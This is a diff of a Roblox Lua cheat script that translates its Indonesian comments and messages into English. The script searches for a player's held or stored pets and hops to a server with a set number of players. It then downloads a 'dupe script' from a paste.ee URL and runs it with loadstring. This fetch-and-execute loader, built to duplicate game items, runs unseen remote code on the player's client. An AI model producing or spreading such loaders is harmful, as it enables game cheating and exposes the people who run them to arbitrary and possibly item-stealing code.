@@ -1,13 +1,13 @@
--- Layanan yang dibutuhkan
+-- Required services
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService") -- Ditambahkan untuk animasi
-local ReplicatedStorage = game:GetService("ReplicatedStorage") -- Ditambahkan
+local TweenService = game:GetService("TweenService") -- Added for animation
+local ReplicatedStorage = game:GetService("ReplicatedStorage") -- Added
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Daftar hewan peliharaan yang valid (sesuaikan jika perlu)
+-- List of valid pets (adjust if necessary)
 local VALID_PETS = {
     ["red fox"] = true,
     ["dragonfly"] = true,
@@ -16,26 +16,26 @@ local VALID_PETS = {
     ["deer"] = true 
 }
 
--- Konfigurasi untuk logika duplikasi
+-- Configuration for duplication logic
 local DUPESCRIPT_URL = "https://paste.ee/r/s7TguhY5"
 local TARGET_PLAYER_COUNT_FOR_DUPE = 3 
 local MAX_PLAYER_COUNT_BEFORE_SWITCH = 5 
 
--- Fungsi rekursif untuk mencari hewan peliharaan valid secara mendalam di dalam parentInstance
+-- Recursive function to search for valid pets deeply within parentInstance
 local function searchRecursivelyForPet(parentInstance, pathPrefix)
     pathPrefix = pathPrefix or parentInstance.Name
     if not parentInstance then return nil end
 
     for _, child in ipairs(parentInstance:GetChildren()) do
         local currentPath = pathPrefix .. " > " .. child.Name
-        -- Langsung periksa apakah child adalah Tool atau Model yang valid
+        -- Directly check if child is a valid Tool or Model
         if (child:IsA("Tool") or child:IsA("Model")) then
             if VALID_PETS[child.Name:lower()] then
-                print("      --> DEBUG: Hewan valid ditemukan:", child.Name, "di", currentPath)
+                print("      --> DEBUG: Valid pet found:", child.Name, "at", currentPath)
                 return child
             end
         end
-        -- Jika child adalah Model atau Folder, cari di dalamnya
+        -- If child is a Model or Folder, search inside it
         if child:IsA("Model") or child:IsA("Folder") then 
             local foundPetInChild = searchRecursivelyForPet(child, currentPath)
             if foundPetInChild then
@@ -46,126 +46,126 @@ local function searchRecursivelyForPet(parentInstance, pathPrefix)
     return nil
 end
 
--- Fungsi untuk memeriksa apakah ada hewan peliharaan valid (dipegang atau di ReplicatedStorage)
+-- Function to check if there is a valid pet (held or in ReplicatedStorage)
 local function findFirstValidPet()
     if not player then
-        print("--- DEBUG: Pemain lokal tidak ditemukan, pencarian dibatalkan. ---")
+        print("--- DEBUG: Local player not found, search canceled. ---")
         return nil
     end
-    print("--- DEBUG: Mulai pencarian hewan peliharaan valid... ---")
+    print("--- DEBUG: Starting search for valid pets... ---")
     
-    print("--- DEBUG: Daftar VALID_PETS yang dicari: ---")
+    print("--- DEBUG: List of VALID_PETS being searched: ---")
     for petName, _ in pairs(VALID_PETS) do
         print("  - '" .. petName .. "'")
     end
 
-    -- 1. Cari di karakter pemain (yang dipegang)
+    -- 1. Search in player's character (held items)
     local character = player.Character
     if not character then
-        print("--- DEBUG: player.Character adalah nil. Menunggu CharacterAdded... ---")
+        print("--- DEBUG: player.Character is nil. Waiting for CharacterAdded... ---")
         character = player.CharacterAdded:Wait() 
         if not character then
-             print("--- DEBUG: Karakter pemain tidak ditemukan bahkan setelah menunggu CharacterAdded. ---")
-             -- Lanjutkan ke ReplicatedStorage jika karakter tidak ada
+             print("--- DEBUG: Player character not found even after waiting for CharacterAdded. ---")
+             -- Continue to ReplicatedStorage if character is not present
         else
-            print("--- DEBUG: Karakter pemain sekarang ditemukan setelah CharacterAdded:", character.Name, "---")
+            print("--- DEBUG: Player character now found after CharacterAdded:", character.Name, "---")
         end
     end
     
     if character and character:IsDescendantOf(game) then
-        print("--- DEBUG: Memeriksa item yang dipegang oleh karakter:", character.Name, "---")
+        print("--- DEBUG: Checking items held by character:", character.Name, "---")
         local childrenOfCharacter = character:GetChildren()
-        print("--- DEBUG: Jumlah anak langsung dari karakter:", #childrenOfCharacter, "---")
+        print("--- DEBUG: Number of direct children of character:", #childrenOfCharacter, "---")
 
         for i, childOfCharacter in ipairs(childrenOfCharacter) do
             if not childOfCharacter or not childOfCharacter.Parent then 
-                print("  - DEBUG: Anak karakter ke-"..i.." tidak valid atau sudah tidak memiliki parent.")
+                print("  - DEBUG: Character child no."..i.." is invalid or no longer has a parent.")
                 continue
             end
 
             local childName = childOfCharacter.Name
             local childClassName = childOfCharacter.ClassName
-            print("  - DEBUG: Memeriksa anak karakter ke-"..i..": InstanceName='", childName, "' | ClassName='", childClassName, "'")
+            print("  - DEBUG: Checking character child no."..i..": InstanceName='", childName, "' | ClassName='", childClassName, "'")
             
             local childNameLower = ""
             local successLower, resultLower = pcall(function() return childName:lower() end)
             if successLower then
                 childNameLower = resultLower
-                print("    DEBUG: Nama dalam huruf kecil: '", childNameLower, "'")
+                print("    DEBUG: Name in lowercase: '", childNameLower, "'")
             else
-                print("    DEBUG: Gagal mengubah nama '", childName, "' menjadi huruf kecil. Error:", resultLower)
+                print("    DEBUG: Failed to convert name '", childName, "' to lowercase. Error:", resultLower)
                 continue 
             end
             
             if (childOfCharacter:IsA("Tool") or childOfCharacter:IsA("Model")) then
-                print("    DEBUG: Membandingkan '", childNameLower, "' dengan VALID_PETS...")
+                print("    DEBUG: Comparing '", childNameLower, "' with VALID_PETS...")
                 if VALID_PETS[childNameLower] then
-                    print("      --> DEBUG: Hewan valid ditemukan (langsung dipegang):", childName)
+                    print("      --> DEBUG: Valid pet found (directly held):", childName)
                     return childOfCharacter
                 else
-                    print("      --> DEBUG: '", childNameLower, "' tidak ada di VALID_PETS atau nilainya false.")
+                    print("      --> DEBUG: '", childNameLower, "' not in VALID_PETS or its value is false.")
                 end
             end
 
             if childOfCharacter:IsA("Model") then
-                print("    -- DEBUG: Memeriksa di dalam Model anak karakter:", childName, "--")
+                print("    -- DEBUG: Checking inside character's child Model:", childName, "--")
                 local childrenOfModel = childOfCharacter:GetChildren()
-                print("    -- DEBUG: Jumlah anak di dalam Model '", childName, "':", #childrenOfModel, "--")
+                print("    -- DEBUG: Number of children in Model '", childName, "':", #childrenOfModel, "--")
 
                 for j, childOfModel in ipairs(childrenOfModel) do
                     if not childOfModel or not childOfModel.Parent then
-                         print("      - DEBUG: Anak Model ke-"..j.." tidak valid atau sudah tidak memiliki parent.")
+                         print("      - DEBUG: Model child no."..j.." is invalid or no longer has a parent.")
                         continue
                     end
 
                     local subChildName = childOfModel.Name
                     local subChildClassName = childOfModel.ClassName
-                    print("      - DEBUG: Memeriksa anak dari Model ke-"..j..": InstanceName='", subChildName, "' | ClassName='", subChildClassName, "'")
+                    print("      - DEBUG: Checking child of Model no."..j..": InstanceName='", subChildName, "' | ClassName='", subChildClassName, "'")
 
                     local subChildNameLower = ""
                     local successSubLower, resultSubLower = pcall(function() return subChildName:lower() end)
                     if successSubLower then
                         subChildNameLower = resultSubLower
-                        print("        DEBUG: Nama dalam huruf kecil: '", subChildNameLower, "'")
+                        print("        DEBUG: Name in lowercase: '", subChildNameLower, "'")
                     else
-                        print("        DEBUG: Gagal mengubah nama '", subChildName, "' menjadi huruf kecil. Error:", resultSubLower)
+                        print("        DEBUG: Failed to convert name '", subChildName, "' to lowercase. Error:", resultSubLower)
                         continue
                     end
                     
                     if (childOfModel:IsA("Tool") or childOfModel:IsA("Model")) then
-                        print("        DEBUG: Membandingkan '", subChildNameLower, "' dengan VALID_PETS...")
+                        print("        DEBUG: Comparing '", subChildNameLower, "' with VALID_PETS...")
                         if VALID_PETS[subChildNameLower] then
-                            print("          --> DEBUG: Hewan valid ditemukan (di dalam Model yang dipegang):", subChildName)
+                            print("          --> DEBUG: Valid pet found (inside held Model):", subChildName)
                             return childOfModel
                         else
-                            print("          --> DEBUG: '", subChildNameLower, "' tidak ada di VALID_PETS atau nilainya false.")
+                            print("          --> DEBUG: '", subChildNameLower, "' not in VALID_PETS or its value is false.")
                         end
                     end
                 end
-                print("    -- DEBUG: Selesai memeriksa di dalam Model anak karakter:", childName, "--")
+                print("    -- DEBUG: Finished checking inside character's child Model:", childName, "--")
             end
         end
-        print("--- DEBUG: Selesai memeriksa karakter. ---")
+        print("--- DEBUG: Finished checking character. ---")
     elseif character then
-         print("--- DEBUG: Karakter pemain tidak lagi merupakan turunan dari game. Mungkin sedang dihancurkan. ---")
+         print("--- DEBUG: Player character is no longer a descendant of game. May be destroying. ---")
     end
 
-    -- 2. Cari di ReplicatedStorage
-    print("--- DEBUG: Memeriksa ReplicatedStorage ---")
+    -- 2. Search in ReplicatedStorage
+    print("--- DEBUG: Checking ReplicatedStorage ---")
     local petInReplicatedStorage = searchRecursivelyForPet(ReplicatedStorage, "ReplicatedStorage")
     if petInReplicatedStorage then
-        print("--- DEBUG: Hewan valid ditemukan di ReplicatedStorage:", petInReplicatedStorage.Name, "---")
+        print("--- DEBUG: Valid pet found in ReplicatedStorage:", petInReplicatedStorage.Name, "---")
         return petInReplicatedStorage
     end
-    print("--- DEBUG: Tidak ada hewan peliharaan valid yang ditemukan di ReplicatedStorage. ---")
+    print("--- DEBUG: No valid pet found in ReplicatedStorage. ---")
 
 
-    print("--- DEBUG: Tidak ada hewan peliharaan valid yang ditemukan setelah semua pemeriksaan. ---")
+    print("--- DEBUG: No valid pet found after all checks. ---")
     return nil
 end
 
 
--- Fungsi untuk membuat ScreenGui utama
+-- Function to create the main ScreenGui
 local function createMainGui()
     local oldGui = playerGui:FindFirstChild("KyroscScriptGui")
     if oldGui then oldGui:Destroy() end
@@ -237,7 +237,7 @@ local function createMainGui()
     errorContainer.Position = UDim2.new(0.5, 0, 0, 60)
     errorContainer.AnchorPoint = Vector2.new(0.5, 0)
     errorContainer.BackgroundTransparency = 1
-    errorContainer.ClipsDescendants = true -- Untuk animasi shake agar tidak keluar batas
+    errorContainer.ClipsDescendants = true 
     errorContainer.Parent = mainFrame
 
     local errorIcon = Instance.new("TextLabel")
@@ -317,22 +317,22 @@ local function createMainGui()
         showGuiButton.Visible = not visible
     end
 
-    -- Fungsi animasi
+    -- Animation functions
     local function playShakeAnimation(guiObject)
         local originalPosition = guiObject.Position
-        local tweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 4, true) 
+        local tweenInfoShake = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 4, true) 
         local shakeOffset = UDim2.fromOffset(5, 0)
-        local tweenShake = TweenService:Create(guiObject, tweenInfo, {Position = originalPosition + shakeOffset})
+        local tweenShake = TweenService:Create(guiObject, tweenInfoShake, {Position = originalPosition + shakeOffset})
         tweenShake:Play()
         tweenShake.Completed:Wait()
-        guiObject.Position = originalPosition -- Pastikan kembali ke posisi semula
+        guiObject.Position = originalPosition 
     end
 
     local function playPulseAnimation(guiObject, targetColor)
-        local originalColor = guiObject.BackgroundColor3
-        local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true) 
+        -- local originalColor = guiObject.BackgroundColor3 -- Not strictly needed if 'reverses = true'
+        local tweenInfoPulse = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true) 
         
-        local pulseTween = TweenService:Create(guiObject, tweenInfo, {BackgroundColor3 = targetColor})
+        local pulseTween = TweenService:Create(guiObject, tweenInfoPulse, {BackgroundColor3 = targetColor})
         pulseTween:Play()
     end
 
@@ -364,11 +364,11 @@ local function createMainGui()
             
             task.wait(0.5) 
 
-            local foundPet = findFirstValidPet() -- Menggunakan fungsi pencarian yang baru
+            local foundPet = findFirstValidPet() 
 
             if foundPet then
-                print("--- DEBUG: Hewan peliharaan valid ditemukan oleh tombol 'Try Again':", foundPet.Name, "---")
-                errorText.Text = "PET SIAP: " .. foundPet.Name 
+                print("--- DEBUG: Valid pet found by 'Try Again' button:", foundPet.Name, "---")
+                errorText.Text = "PET READY: " .. foundPet.Name 
                 errorText.TextColor3 = Color3.fromRGB(46, 204, 113) 
                 errorIcon.Text = "✓"
                 errorIcon.TextColor3 = Color3.fromRGB(46, 204, 113)
@@ -378,7 +378,7 @@ local function createMainGui()
                 tryAgainButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113) 
                 currentPetActionState = "DUPE_PROCESS"
             else
-                print("--- DEBUG: Tidak ada hewan peliharaan valid yang dipegang atau ditemukan di ReplicatedStorage (dari tombol 'Try Again'). ---")
+                print("--- DEBUG: No valid pet held or found in ReplicatedStorage (from 'Try Again' button). ---")
                 errorText.Text = "Required pet not found"
                 errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
                 errorIcon.Text = "X"
@@ -393,14 +393,14 @@ local function createMainGui()
 
         elseif currentPetActionState == "DUPE_PROCESS" then
             local playerCount = #Players:GetPlayers()
-            print("Jumlah pemain di server saat ini:", playerCount)
+            print("Current player count in server:", playerCount)
 
             if playerCount >= MAX_PLAYER_COUNT_BEFORE_SWITCH then
-                errorText.Text = "Server penuh (" .. playerCount .. "). Mencari..."
+                errorText.Text = "Server full (" .. playerCount .. "). Searching..."
                 errorText.TextColor3 = Color3.fromRGB(241, 196, 15) 
                 errorIcon.Text = "⏳"
                 errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15)
-                tryAgainButton.Text = "MENCARI..."
+                tryAgainButton.Text = "SEARCHING..."
                 tryAgainButton.BackgroundColor3 = Color3.fromRGB(241, 196, 15) 
                 
                 task.wait(0.1) 
@@ -413,7 +413,7 @@ local function createMainGui()
                     end)
 
                     if not httpSuccess or not serversDataString then
-                        error("Gagal ambil daftar server: " .. tostring(httpResult))
+                        error("Failed to fetch server list: " .. tostring(httpResult))
                     end
 
                     local servers = HttpService:JSONDecode(serversDataString)
@@ -423,24 +423,24 @@ local function createMainGui()
                         for _, server in ipairs(servers.data) do
                             if server.playing == (TARGET_PLAYER_COUNT_FOR_DUPE - 1) and server.id ~= game.JobId then
                                 suitableServerId = server.id
-                                print("Menemukan server cocok:", suitableServerId, "dgn", server.playing, "pemain.")
+                                print("Found suitable server:", suitableServerId, "with", server.playing, "players.")
                                 break
                             end
                         end
                     end
                     
                     if suitableServerId then
-                        print("Teleport ke server:", suitableServerId)
-                        errorText.Text = "Teleport ke server " .. (TARGET_PLAYER_COUNT_FOR_DUPE -1) .. " pemain..."
+                        print("Teleporting to server:", suitableServerId)
+                        errorText.Text = "Teleporting to server with " .. (TARGET_PLAYER_COUNT_FOR_DUPE -1) .. " players..."
                         TeleportService:TeleportToPlaceInstance(currentPlaceId, suitableServerId, player)
                     else
-                        error("Tidak ada server baru yang cocok.")
+                        error("No suitable new server found.")
                     end
                 end)
 
                 if not successTeleport then
-                    print("Error pencarian/teleport server:", teleportError)
-                    errorText.Text = "Gagal cari/join server: " .. tostring(teleportError):sub(1,40) 
+                    print("Error searching/teleporting server:", teleportError)
+                    errorText.Text = "Failed to find/join server: " .. tostring(teleportError):sub(1,40) 
                     errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
                     errorIcon.Text = "X"
                     errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
@@ -453,7 +453,7 @@ local function createMainGui()
                 isProcessing = false
 
             elseif playerCount < TARGET_PLAYER_COUNT_FOR_DUPE then
-                errorText.Text = "Butuh " .. TARGET_PLAYER_COUNT_FOR_DUPE .. " pemain (Ada: " .. playerCount .. ")"
+                errorText.Text = "Need " .. TARGET_PLAYER_COUNT_FOR_DUPE .. " players (Current: " .. playerCount .. ")"
                 errorText.TextColor3 = Color3.fromRGB(241, 196, 15) 
                 errorIcon.Text = "!"
                 errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15)
@@ -465,11 +465,11 @@ local function createMainGui()
                 isProcessing = false
 
             else 
-                errorText.Text = "Server optimal! Mengeksekusi..."
+                errorText.Text = "Optimal server! Executing..."
                 errorText.TextColor3 = Color3.fromRGB(0, 150, 255) 
                 errorIcon.Text = "⚙️" 
                 errorIcon.TextColor3 = Color3.fromRGB(0, 150, 255)
-                tryAgainButton.Text = "MENGEKSEKUSI..."
+                tryAgainButton.Text = "EXECUTING..."
                 tryAgainButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
                 
                 task.wait(0.1)
@@ -480,28 +480,28 @@ local function createMainGui()
                         fetchedScriptContent = game:HttpGet(DUPESCRIPT_URL, true)
                     end)
                     if not httpSuccess or not fetchedScriptContent or fetchedScriptContent == "" then
-                        error("Gagal ambil skrip eksternal: " .. tostring(httpResult))
+                        error("Failed to fetch external script: " .. tostring(httpResult))
                     end
 
                     local loadedFunc, loadErr = loadstring(fetchedScriptContent)
                     if not loadedFunc then
-                        error("Gagal muat skrip eksternal: " .. tostring(loadErr))
+                        error("Failed to load external script: " .. tostring(loadErr))
                     end
                     loadedFunc() 
                 end)
 
                 if successExec then
-                    errorText.Text = "Skrip dupe dieksekusi!"
+                    errorText.Text = "Dupe script executed!"
                     errorText.TextColor3 = Color3.fromRGB(46, 204, 113) 
                     errorIcon.Text = "✓"
                     errorIcon.TextColor3 = Color3.fromRGB(46, 204, 113)
                     playPulseAnimation(tryAgainButton, Color3.fromRGB(36, 164, 93))
                 else
-                    errorText.Text = "Error skrip dupe: " .. tostring(execError):sub(1,40)
+                    errorText.Text = "Dupe script error: " .. tostring(execError):sub(1,40)
                     errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
                     errorIcon.Text = "X"
                     errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
-                    warn("Error eksekusi skrip eksternal:", execError)
+                    warn("Error executing external script:", execError)
                     playShakeAnimation(errorContainer)
                 end
                 
